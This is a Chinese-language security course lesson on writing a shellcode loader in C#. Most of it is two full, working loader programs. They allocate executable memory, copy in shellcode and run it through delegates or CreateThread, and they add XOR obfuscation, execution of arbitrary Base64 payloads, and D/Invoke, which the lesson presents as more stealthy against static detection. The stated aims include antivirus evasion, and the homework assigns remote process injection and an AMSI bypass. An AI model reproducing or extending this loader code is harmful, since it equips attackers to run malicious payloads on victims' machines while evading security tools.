# 课时05 - C#实现ShellCode Loader

## 课程目标
1. 掌握C#调用Windows API的P/Invoke技术
2. 理解托管代码与非托管代码的交互
3. 实现C#版本的ShellCode Loader
4. 了解.NET程序的免杀特性

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| P/Invoke | Platform Invocation | .NET调用非托管代码的机制 |
| DllImport | - | 声明外部DLL函数的特性 |
| Marshal | - | 托管和非托管内存转换类 |
| IntPtr | - | 平台相关的指针类型 |
| GCHandle | Garbage Collector Handle | 防止对象被GC回收 |

## 代码实现

### 1. 基础C# Loader

```csharp
// Program.cs
// C# ShellCode Loader

using System;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{
    class Program
    {
        // Windows API声明
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);
        
        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);
        
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll")]
        static extern void RtlMoveMemory(
            IntPtr dest,
            byte[] src,
            uint size);
        
        // 常量
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint INFINITE = 0xFFFFFFFF;
        
        // 测试ShellCode
        static byte[] shellcode = new byte[] {
            0x90, 0x90, 0x90, 0x90,  // NOP
            0x31, 0xC0,              // xor eax, eax
            0x40,                    // inc eax
            0xC3                     // ret
        };
        
        // 方法1: 基础VirtualAlloc + 函数指针
        static void Method1_Basic()
        {
            Console.WriteLine("[*] Method 1: Basic VirtualAlloc");
            
            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAlloc failed");
                return;
            }
            
            Console.WriteLine($"[+] Allocated at: 0x{addr.ToInt64():X}");
            
            // 复制ShellCode
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            // 转换为委托并执行
            var func = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(addr);
            int result = func();
            
            Console.WriteLine($"[+] Returned: {result}");
            
            VirtualFree(addr, 0, MEM_RELEASE);
        }
        
        // 委托定义
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int ShellcodeDelegate();
        
        // 方法2: CreateThread
        static void Method2_Thread()
        {
            Console.WriteLine("[*] Method 2: CreateThread");
            
            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            
            if (addr == IntPtr.Zero) return;
            
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            uint threadId;
            IntPtr hThread = CreateThread(
                IntPtr.Zero,
                0,
                addr,
                IntPtr.Zero,
                0,
                out threadId);
            
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] CreateThread failed");
                return;
            }
            
            Console.WriteLine($"[+] Thread ID: {threadId}");
            
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            VirtualFree(addr, 0, MEM_RELEASE);
        }
        
        // 方法3: 两步分配
        static void Method3_TwoStep()
        {
            Console.WriteLine("[*] Method 3: Two-Step Allocation");
            
            // 步骤1: RW
            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);
            
            if (addr == IntPtr.Zero) return;
            
            Console.WriteLine($"[+] Allocated RW at: 0x{addr.ToInt64():X}");
            
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            // 步骤2: RX
            uint oldProtect;
            VirtualProtect(addr, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
            
            Console.WriteLine("[+] Changed to RX");
            
            var func = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(addr);
            int result = func();
            
            Console.WriteLine($"[+] Returned: {result}");
        }
        
        // 方法4: 使用GCHandle固定托管数组
        static void Method4_GCHandle()
        {
            Console.WriteLine("[*] Method 4: GCHandle Pinning");
            
            // 固定数组防止GC移动
            GCHandle handle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr addr = handle.AddrOfPinnedObject();
            
            // 修改内存权限
            uint oldProtect;
            VirtualProtect(addr, (uint)shellcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            
            var func = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(addr);
            int result = func();
            
            Console.WriteLine($"[+] Returned: {result}");
            
            // 恢复权限
            VirtualProtect(addr, (uint)shellcode.Length, oldProtect, out oldProtect);
            
            handle.Free();
        }
        
        // 方法5: XOR解密
        static byte[] XorDecrypt(byte[] data, byte key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key);
            }
            return result;
        }
        
        static void Method5_Encrypted()
        {
            Console.WriteLine("[*] Method 5: XOR Encrypted");
            
            byte key = 0x41;
            
            // 预加密的ShellCode
            byte[] encrypted = new byte[shellcode.Length];
            for (int i = 0; i < shellcode.Length; i++)
            {
                encrypted[i] = (byte)(shellcode[i] ^ key);
            }
            
            // 解密
            byte[] decrypted = XorDecrypt(encrypted, key);
            
            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)decrypted.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
            
            var func = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(addr);
            int result = func();
            
            Console.WriteLine($"[+] Returned: {result}");
        }
        
        // 方法6: 从Base64加载
        static void Method6_Base64(string b64)
        {
            Console.WriteLine("[*] Method 6: Base64 Decode");
            
            byte[] decoded = Convert.FromBase64String(b64);
            Console.WriteLine($"[+] Decoded {decoded.Length} bytes");
            
            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)decoded.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(decoded, 0, addr, decoded.Length);
            
            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        
        static void Main(string[] args)
        {
            Console.WriteLine("========================================");
            Console.WriteLine("     C# ShellCode Loader               ");
            Console.WriteLine("========================================");
            Console.WriteLine();
            
            Method1_Basic();
            Console.WriteLine();
            
            Method2_Thread();
            Console.WriteLine();
            
            Method3_TwoStep();
            Console.WriteLine();
            
            Method4_GCHandle();
            Console.WriteLine();
            
            Method5_Encrypted();
            Console.WriteLine();
            
            // Base64示例
            if (args.Length > 0)
            {
                Method6_Base64(args[0]);
            }
            
            Console.WriteLine("[*] Done");
        }
    }
}
```

### 2. 使用D/Invoke (更隐蔽)

```csharp
// DInvokeLoader.cs
// 使用动态调用避免静态导入

using System;
using System.Runtime.InteropServices;

namespace DInvokeLoader
{
    class Program
    {
        // 动态获取函数委托
        static T GetDelegate<T>(string dll, string func) where T : Delegate
        {
            IntPtr hModule = LoadLibrary(dll);
            IntPtr pFunc = GetProcAddress(hModule, func);
            return Marshal.GetDelegateForFunctionPointer<T>(pFunc);
        }
        
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        
        // 委托定义
        delegate IntPtr VirtualAllocDelegate(IntPtr addr, uint size, uint type, uint protect);
        delegate bool VirtualProtectDelegate(IntPtr addr, uint size, uint protect, out uint old);
        delegate IntPtr CreateThreadDelegate(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint id);
        delegate uint WaitDelegate(IntPtr handle, uint ms);
        
        static void ExecuteWithDInvoke(byte[] shellcode)
        {
            Console.WriteLine("[*] Dynamic Invoke Execution");
            
            // 动态获取API
            var virtualAlloc = GetDelegate<VirtualAllocDelegate>("kernel32.dll", "VirtualAlloc");
            var virtualProtect = GetDelegate<VirtualProtectDelegate>("kernel32.dll", "VirtualProtect");
            var createThread = GetDelegate<CreateThreadDelegate>("kernel32.dll", "CreateThread");
            var wait = GetDelegate<WaitDelegate>("kernel32.dll", "WaitForSingleObject");
            
            // 执行
            IntPtr addr = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x04);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            uint old;
            virtualProtect(addr, (uint)shellcode.Length, 0x20, out old);
            
            uint tid;
            IntPtr thread = createThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
            wait(thread, 0xFFFFFFFF);
            
            Console.WriteLine("[+] Completed");
        }
        
        static void Main(string[] args)
        {
            byte[] sc = new byte[] { 0x90, 0x90, 0x31, 0xC0, 0x40, 0xC3 };
            ExecuteWithDInvoke(sc);
        }
    }
}
```

## 课后作业

### 作业1：实现AES解密
添加AES-256-CBC解密支持。

### 作业2：实现远程注入
使用OpenProcess和CreateRemoteThread实现远程注入。

### 作业3：添加AMSI绑过
研究并实现AMSI绑过技术。
